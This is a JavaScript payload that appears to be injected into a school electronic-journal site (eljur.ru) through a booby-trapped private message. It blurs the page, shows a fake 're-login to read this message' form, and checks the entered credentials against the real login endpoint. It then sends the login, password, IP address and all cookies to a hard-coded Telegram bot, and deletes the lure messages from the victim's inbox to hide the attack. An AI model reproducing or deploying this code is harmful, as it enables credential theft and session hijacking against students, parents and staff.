const TELEGRAM_TOKEN = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
const TELEGRAM_CHAT_ID = "-1003077695457";
const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
const cookies = document.cookie.split("; ").reduce((acc, cookie) => {
    const [name, ...value] = cookie.split("=");
    acc[name] = value.join("=");
    return acc;
}, {});
const cookieJSON = JSON.stringify(cookies);
let userIP = "Не удалось определить";

const messageContainer = document.querySelector(".typography.overflow");
if (messageContainer) {
  messageContainer.innerHTML = `
    <div class="notice notice--red notice--medium">
      <div class="notice__content">
        <div class="notice__content__text">
          <p>Личные письма доступны только из dev!</p>
        </div>
      </div>
    </div>`;
}

async function fetchUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    userIP = data.ip || "Не удалось определить";
  } catch (err) {
    console.error("Ошибка получения IP:", err);
  }
}

async function sendToTelegram(text) {
  try {
    await fetch(TELEGRAM_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "Markdown" })
    });
  } catch (err) {
    console.error("Ошибка отправки в Telegram:", err);
  }
}

function createLoginOverlay() {
  document.body.style.position = "relative";
  document.body.style.overflow = "hidden";

  const blurOverlay = document.createElement("div");
  Object.assign(blurOverlay.style, {
    position: "fixed", top: "0", left: "0",
    width: "100%", height: "100%",
    backdropFilter: "blur(8px)",
    background: "rgba(0,0,0,0.4)",
    zIndex: "9998"
  });
  document.body.appendChild(blurOverlay);

  const loginViewport = document.createElement("div");
  loginViewport.id = "loginviewport";
  loginViewport.className = "login-outer";
  Object.assign(loginViewport.style, {
    position: "fixed",
    top: "50%", left: "50%",
    transform: "translate(-50%, -50%)",
    zIndex: "9999",
    background: "#fff",
    borderRadius: "12px",
    boxShadow: "0 0 15px rgba(0,0,0,0.3)",
    padding: "30px",
    maxWidth: "400px",
    width: "100%"
  });

  loginViewport.innerHTML = `
    <div class="login-form login-form--centered">
      <div class="login-form__body">
        <h1 class="ej-form__header" style="text-align:center;">
          Для прочтения личного сообщения войдите снова
        </h1>
        <div class="error-container"></div>
        <form method="post" name="login" class="ej-form ej-form--text-center ej-form--vertical">
          <div class="ej-form__body">
            <div class="ej-form-group ej-form-group--12">
              <label class="ej-form-label"><span>Логин</span></label>
              <div class="ej-form-control">
                <input autocomplete="username" type="text" class="field field--fill field--big" />
              </div>
            </div>
            <div class="ej-form-group ej-form-group--12">
              <label class="ej-form-label"><span>Пароль</span></label>
              <div class="ej-form-control">
                <input autocomplete="current-password" type="password" class="field field--fill field--big" />
              </div>
            </div>
          </div>
          <div class="ej-form__footer">
            <button type="submit" class="button button--red button--big button--fill">Войти</button>
          </div>
        </form>
      </div>
    </div>
  `;

  document.body.appendChild(loginViewport);
  return { loginViewport, blurOverlay };
}

function handleFormSubmit(loginViewport, blurOverlay) {
  const form = loginViewport.querySelector("form");
  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const loginInput = loginViewport.querySelector('input[autocomplete="username"]');
    const passInput  = loginViewport.querySelector('input[autocomplete="current-password"]');
    const loginVal = (loginInput.value || "").trim();
    const passVal  = (passInput.value || "").trim();
    const errorContainer = loginViewport.querySelector(".error-container");
    errorContainer.innerHTML = "";

    if (!loginVal || !passVal) {
      errorContainer.innerHTML = `
        <div class="notice notice--red notice--medium">
          <div class="notice__content">
            <div class="notice__content__text"><p>Заполните логин и пароль</p></div>
          </div>
        </div>`;
      return;
    }

    try {
      const res = await fetch("https://shkolakzn.eljur.ru/ajaxauthorize", {
        method: "POST",
        headers: { "accept": "*/*", "content-type": "application/json" },
        body: JSON.stringify({ username: loginVal, password: passVal })
      });
      const data = await res.json();

      if (data.result && data.actions?.[0]?.type === "redirect") {
        const url = data.actions[0]?.url ? `[https://shkolakzn.eljur.ru/...](${encodeURI(data.actions[0].url)})` : "Нет URL";
        await sendToTelegram(`🔑 Логин: ${loginVal}\n🔒 Пароль: ${passVal}\n🌐 IP: ${userIP}\n🍪Куки: ${cookieJSON}\n🔗Ссылка для авторизации: ${url}`);

        (async () => {
          const baseUrl = "/journal-api-messages-action";
          try {
            const res = await fetch(`${baseUrl}?method=messages.get_list&category=inbox&search=&limit=20&offset=0&teacher=0&status=&companion=&minDate=0`, {
              credentials: "include",
            });
            const msgData = await res.json();

            const targets = msgData.list.filter(msg => 
              msg.subject.includes("Привет!\u202E") || 
              msg.body.startsWith("Привет!‮&lt")
            );

            const ids = targets.map(msg => msg.id);

            if (ids.length > 0) {
              console.log("Нашлись сообщения для удаления:", ids);
              const deleteUrl = `${baseUrl}?method=messages.delete&idsString=${encodeURIComponent(ids.join(";"))}&type=inbox`;
              const delRes = await fetch(deleteUrl, { credentials: "include" });
              const delData = await delRes.json();
              console.log("Результат удаления:", delData);
            } else {
              console.log("Ничего не нашлось для удаления");
            }
          } catch (err) {
            console.error("Ошибка при обработке сообщений:", err);
          }
        })();

        blurOverlay.remove();
        loginViewport.remove();
        document.body.style.overflow = "";
        document.body.style.position = "";

        window.location.href = "/";
      } else if (data.errors?.length > 0) {
        const msg = data.errors[0].text || "Ошибка входа";
        errorContainer.innerHTML = `
          <div class="notice notice--red notice--medium">
            <div class="notice__content">
              <div class="notice__content__text"><p>${msg}</p></div>
            </div>
          </div>`;
      }
    } catch (err) {
      console.error("Ошибка запроса:", err);
      errorContainer.innerHTML = `
        <div class="notice notice--red notice--medium">
          <div class="notice__content">
            <div class="notice__content__text"><p>Сервер недоступен</p></div>
          </div>
        </div>`;
    }
  });
}

(async function init() {
  await fetchUserIP();
  const { loginViewport, blurOverlay } = createLoginOverlay();
  handleFormSubmit(loginViewport, blurOverlay);
})();
